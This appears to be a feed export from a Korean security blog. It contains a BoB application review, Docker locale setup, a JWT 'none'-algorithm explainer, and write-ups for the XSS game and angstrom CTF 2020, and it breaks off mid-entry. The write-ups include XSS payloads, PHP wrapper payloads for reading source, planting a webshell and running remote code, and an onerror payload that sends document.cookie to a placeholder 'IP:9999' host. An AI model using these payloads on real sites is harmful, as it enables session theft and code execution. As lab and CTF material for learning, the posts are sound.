        <content type="html"><![CDATA[<p>올해도 bob 9기 교육생 모집이 시작되었습니다..!!</p><p>이번에도 기회가 주어진 만큼 열심히 준비하고 꼭 붙고 싶은 마음 뿐입니다..!</p><p>9기 이전에 저는 8기 때도 bob에 교육생으로 지원하게 되었습니다.</p><p>체계적인 교육 과정과 프로젝트 등.. 제가 생각하는 bob는 기대 그 이상으로 좋은 프로그램이라고 생각하고 있습니다. 지금도 그렇구요</p><p>먼저 서류에 대해서 약간 후기를 남겨봅니다.</p><ul><li><p>자기소개서</p></li><li><p>본인이 이룬 성과 및 사례</p></li><li><p>지원동기</p></li><li><p>합격후 포부</p></li><li><p>관심 분야</p></li><li><p>학업 계휙</p></li><li><p>진로 계휙</p></li></ul><p>전반적으로 위 7가지 항목에 대해서 내가 어떤 사람이고, 보안에 어떻게 관심을 가졌는지, 지금까지 어떤 활동을 해왔는지 등에 대해서</p><p>상세적으로 풀어서 작성하였습니다.. 정확히 어떤 내용을 작성해야 하는지는 이제 본인이 직접 하나씩 트리를 정리해보면서 작성해보시는 것을 권유드립니다.</p><p>일단 서류도 보면 경쟁률이 어마어마 하기 때문에 절대! 모든 항목에 대해 소홀히 쓰시면 안되고 어필할 수 있는 것을 모두</p><p>짧고 굵게 어필 해야 한다고 생각이 듭니다 ㅎㅎ..</p><p>앗! 또한 서류 작성하실 때 거짓된 내용, 자기가 한것처럼 꾸미는 내용, 아는척(?) 에 대해서 글을 쓰시면 안됩니다.</p><p>멘토님들이 서류를 하나하나 모두 검토하시기 때문에 서류는 붙을 수 있어도 면접에서 다 들통나게 됩니다..</p><p>(거짓된 내용 쓸려는 생각 자체가 잘못된거죠 사실,,)</p><p>서류 지원 기간은 약 한달 정도 있었는데 여차저차 하면서 사실 촉박하게 준비한 것은 맞습니다</p><p>그럼에도 불구하고 운 좋게 서류 합격 통보를 받았고 면접까지 갈 수 있는 기회가 생기게 되면서 저는 조금 기뻤지만,</p><p>감격도 잠시.. 저는 앞에 말했듯이 너무 촉박하게 준비한 탓에 프로젝트를 뭘 해야할까도 생각해야 했고</p><p>여러 무거운 관문앞에 서 있었습니다.. (사실 여기서 내가 지금 준비된게 맞을까? ) 이런 생각도 들었지만</p><p>그래도 기회가 주어진 만큼 최선을 다하자고 다짐하면서 제가 하고 싶은 프로젝트를 주제로 준비하였습니다</p><p>일단 면접을 볼때 면접대기실 분위기 자체는 괜찮았습니다. (사람 마다 느끼는건 다르지만)</p><p>멘토님 3명, 지원자 3명 이렇게 면접장에 들어가 3:3 면접을 보았는데 와.. 면접장에 들어가는 순간부터</p><p>정말 무거운 분위기가 저를 반겨주더군요,, 엄청나게 긴장하였습니다..</p><p>그 탓인지 아는 것도 재대로 답을 하지 못했고 말을 얼버무렸습니다.. 감점요소가 제일 큰 부분이 아닐까 싶습니다.</p><p>일단 들어가면 PT 발표를 진행하게 되는데 발표 시간은 3분 이였습니다. 즉 임팩트 있게 중요한 내용만</p><p>넣어서 발표를 해야한다는 뜻이고 시간을 넘어도 끊지는 않으십니다 시간이 넘었다고 해서 당황할 필요는 없을 것 같습니다.</p><p>사실 여기까지만 보면 제가 준비 기간이 넉넉했음에도 재대로 준비를 안했던 것이 비중이 큽니다</p><p>그래도 부족한 저를 면접까지 볼 수 있는 기회를 주셨고,, 끝까지 면접 봐주신 멘토님들에게 감사 인사를 드리고 싶습니다.</p><p>결과로는 불합격을 하였지만 이번에 9기에도 지원할 수 있는 기회가 생겼으니</p><p>이번에는 꼼꼼하게 미리 잘 준비하여 기회를 잡고 싶은 심정이네요,,</p>]]></content>
      
      
      <categories>
          
          <category> Memo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BoB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(ko) Docker Language Setting</title>
      <link href="2020/04/22/dockerset-200422/"/>
      <url>2020/04/22/dockerset-200422/</url>
      
        <content type="html"><![CDATA[<h3 id="1-설정-변경-사항"><a href="#1-설정-변경-사항" class="headerlink" title="1. 설정 변경 사항"></a>1. 설정 변경 사항</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install locales</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LANGUAGE=ko_KR.UTF-8</span><br><span class="line"><span class="built_in">export</span> LANG=ko_KR.UTF-8</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">locale-gen ko_KR ko_KR.UTF-8</span><br><span class="line">update-locale LANG=ko_KR.UTF-8</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>근데 한글화가 필요하면, 도커 빌드 때 미리 해두는게 솔직히 편하다.. 그래서 아래에 도커 빌드 설정도 첨부해보려 한다.</p><ul><li>Dockerfile</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RUN apt-get install language-pack-ko -y</span><br><span class="line">RUN apt-get install fonts-nanum -y</span><br><span class="line">RUN apt-get install fonts-nanum-coding -y</span><br><span class="line"></span><br><span class="line">RUN locale-gen ko_KR.UTF-8</span><br><span class="line">ENV LANG ko_KR.UTF-8</span><br><span class="line">ENV LANGUAGE ko_KR.UTF-8</span><br><span class="line">ENV LC_ALL ko_KR.UTF-8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT None Type Injection</title>
      <link href="2020/04/22/jwtinjection-200422/"/>
      <url>2020/04/22/jwtinjection-200422/</url>
      
        <content type="html"><![CDATA[<h3 id="1-JWT-JSON-WEB-TOKEN"><a href="#1-JWT-JSON-WEB-TOKEN" class="headerlink" title="1. JWT(JSON WEB TOKEN)"></a>1. JWT(JSON WEB TOKEN)</h3><p>JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다.</p><p>JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다.</p><hr><h3 id="2-JWT-TOKEN"><a href="#2-JWT-TOKEN" class="headerlink" title="2. JWT TOKEN"></a>2. JWT TOKEN</h3><p>JWT는 아래와 같은 형태를 가지고 있고,</p><p>Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다.</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8</p><p>헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;name&quot;: &quot;jhyeon&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데,</p><p>이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다.</p><hr><h3 id="3-How-to-JWT-None-Type-Attack"><a href="#3-How-to-JWT-None-Type-Attack" class="headerlink" title="3. How to JWT None Type Attack?"></a>3. How to JWT None Type Attack?</h3><p>JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데,</p><p>이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, 잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다.</p><p>따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다.</p><ul><li>참고 : <a href="https://jwt.io/">https://jwt.io</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php wrapper</title>
      <link href="2020/04/22/phpwrapper-200422/"/>
      <url>2020/04/22/phpwrapper-200422/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">expect://expect://ls</span><br><span class="line">php:filterphp://filter/convert.base64-encode/resource=index.php</span><br><span class="line">zip://zip://filename.zip<span class="comment">#webshell.php</span></span><br><span class="line">data://data://text/plain;base64,&#123;RCE CODE HERE&#125;</span><br><span class="line">php://input<span class="built_in">echo</span> base64_encode(file_get_contents(<span class="string">&quot;filename&quot;</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mprotect Exploitation</title>
      <link href="2020/04/22/pwn-mprotect-200422/"/>
      <url>2020/04/22/pwn-mprotect-200422/</url>
      
        <content type="html"><![CDATA[<h3 id="1-참고-링크-Notion"><a href="#1-참고-링크-Notion" class="headerlink" title="1. 참고 링크(Notion)"></a>1. 참고 링크(Notion)</h3><ul><li>Notion : <a href="https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301">https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Mprotect </tag>
            
            <tag> Shellcode </tag>
            
            <tag> Exploitation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss game Write up</title>
      <link href="2020/04/22/xssgame-200422/"/>
      <url>2020/04/22/xssgame-200422/</url>
      
        <content type="html"><![CDATA[<p>홈페이지 : <a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.</p><hr><h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">        $(<span class="string">&#x27;#tabContent&#x27;</span>).html(html);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">window</span>.location.hash = num;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(num)) &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.postMessage(self.location.toString(), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">          chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="literal">false</span>);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;img src=<span class="string">&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27;</span> /&gt;</span><br></pre></td></tr></table></figure><p>chooseTab 함수가 호출될 때, 위와 같이 img 태그를 사용하고 있다.</p><p>여기서 onerror event handler 사용할려면 #framenum.jpg’ onerror=~ 와 같이 페이로드를 완성해주면 된다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frame#4.jpg&#x27; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span><br><span class="line">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span><br><span class="line">          <span class="built_in">window</span>.history.back();</span><br><span class="line">        &#125;, seconds * <span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;/static/loading.gif&quot;</span> onload=<span class="string">&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>타이머 호출 스크립트이다, 그냥 입력한 숫자만큼 타이머가 돌아가는 구조라서 딱히 건드릴 부분은 없다.</p><p>하지만, 위 부분을 보면 onload event handler 로 스크립트를 실행하고 있다.</p><p>즉, onload 부분을 이용해서 alert를 띄워주면 된다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timer=1&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure><hr><h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">  Welcome! Today we are announcing the much anticipated<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/level5/frame/signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">  for an exclusive Beta.</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>welcome.html 에서 sign up 페이지로 넘어가는 과정을 보면 ?next= 파라미터에 confirm 값을 담아서 a 태그로 페이지를 넘긴다.</p><p>여기서 보면 get 방식으로 값이 넘어오기 때문에 next= 에 대한 값을 바꿀 수 있게 된다.</p><p>즉, href 속성 값의 next= 파라미터의 값을 통해 alert 팝업을 실행해야 하는데, a 태그에서의 javascript 실행은 다음과 같이 구성된다.</p><p>javascript:alert(1)</p><p>그래서 next=javascript:alert(1) 를 입력해주면 next 버튼을 클릭했을 때 자바스크립트 팝업창이 실행된다.</p><hr><h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setInnerText</span>(<span class="params">element, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (element.innerText) &#123;</span><br><span class="line">    element.innerText = value;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    element.textContent = value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeGadget</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> scriptEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This will totally prevent us from loading evil URLs!</span></span><br><span class="line">  <span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</span><br><span class="line">    setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">      <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load this awesome gadget</span></span><br><span class="line">  scriptEl.src = url;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Show log messages</span></span><br><span class="line">  scriptEl.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span><br><span class="line">      <span class="string">&quot;Loaded gadget from &quot;</span> + url);</span><br><span class="line">  &#125;</span><br><span class="line">  scriptEl.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span><br><span class="line">      <span class="string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">document</span>.head.appendChild(scriptEl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Take the value after # and use it as the gadget filename.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getGadgetName</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">includeGadget(getGadgetName());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">    includeGadget(getGadgetName());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>마지막 문제이다, 전체적인 코드가 좀 긴데 보면은 url.match 로 https 값이 있는지 검증해서 필터링한다.</p><p>그렇다고 http를 넣어서 하면은 http를 포함할 수 없다고 오류 메세지를 친절하게 반환해준다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;값&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>위 조건을 통과하고 나면 script를 호출하게 되는데 위와 같이 실행된다.</p><p>문제의 의도대로 풀려면 힌트에서 주어지는 google api 를 통해서 보면 되는데, https ://google.com/jsapi?callback=foo 여기서 함수 호출 과정을 보니 callback 파리미터로 넘어온 변수를 실행시켜주고 있다.</p><p>그렇기에 callback 파라미터로 alert를 날려주면 alert(); 이 실행될 것 이다.</p><p>#Https://google.com/jsapi?callback=alert</p><hr><h3 id="ALL-CLEAR"><a href="#ALL-CLEAR" class="headerlink" title="ALL CLEAR"></a>ALL CLEAR</h3>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angstorm ctf 2020 Write up</title>
      <link href="2020/04/10/angstormctf-200410/"/>
      <url>2020/04/10/angstormctf-200410/</url>
      
        <content type="html"><![CDATA[<h3 id="1-WEB-The-Magic-Word"><a href="#1-WEB-The-Magic-Word" class="headerlink" title="1. [WEB - The Magic Word]"></a>1. [WEB - The Magic Word]</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">&quot;magic&quot;</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (magic.innerText == <span class="string">&quot;please give flag&quot;</span>) &#123;</span><br><span class="line">        fetch(<span class="string">&quot;/flag?msg=&quot;</span> + <span class="built_in">encodeURIComponent</span>(msg.innerText))</span><br><span class="line">        .then(<span class="function"><span class="params">res</span> =&gt;</span> res.text())</span><br><span class="line">        .then(<span class="function"><span class="params">txt</span> =&gt;</span> magic.innerText = txt.split<span class="string">``</span>.map(<span class="function"><span class="params">v</span> =&gt;</span> <span class="built_in">String</span>.fromCharCode(v.charCodeAt(<span class="number">0</span>) ^ <span class="number">0xf</span>)).join<span class="string">``</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>magic 텍스트의 값을 please give flag 으로 바꿔주면 된다.</p><hr><h3 id="2-WEB-Xmas-Still-Stands"><a href="#2-WEB-Xmas-Still-Stands" class="headerlink" title="2. [WEB - Xmas Still Stands]"></a>2. [WEB - Xmas Still Stands]</h3><p>문제 내 post 기능에서 xss 취약점이 발생한다.</p><p>글을 써놓고 report 기능을 통해 게시글 번호를 전송해주면 봇이 내 글에 방문하기 때문에</p><p>리다이렉션으로 돌려놓고 포트 열고 대기하면 쿠키값이 날아오는데 날아오는 쿠키값으로</p><p>페이지 내 쿠키를 다시 세팅해주고 /admin 으로 접속하면 된다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">this.src</span>=<span class="string">&#x27;https://IP:9999/?cookie=&#x27;</span>+<span class="attr">document.cookie</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1<br>-&gt; super_secret_admin_cookie=hello_yes_i_am_admin</p><hr><h3 id="3-WEB-Consolation"><a href="#3-WEB-Consolation" class="headerlink" title="3. [WEB - Consolation]"></a>3. [WEB - Consolation]</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span 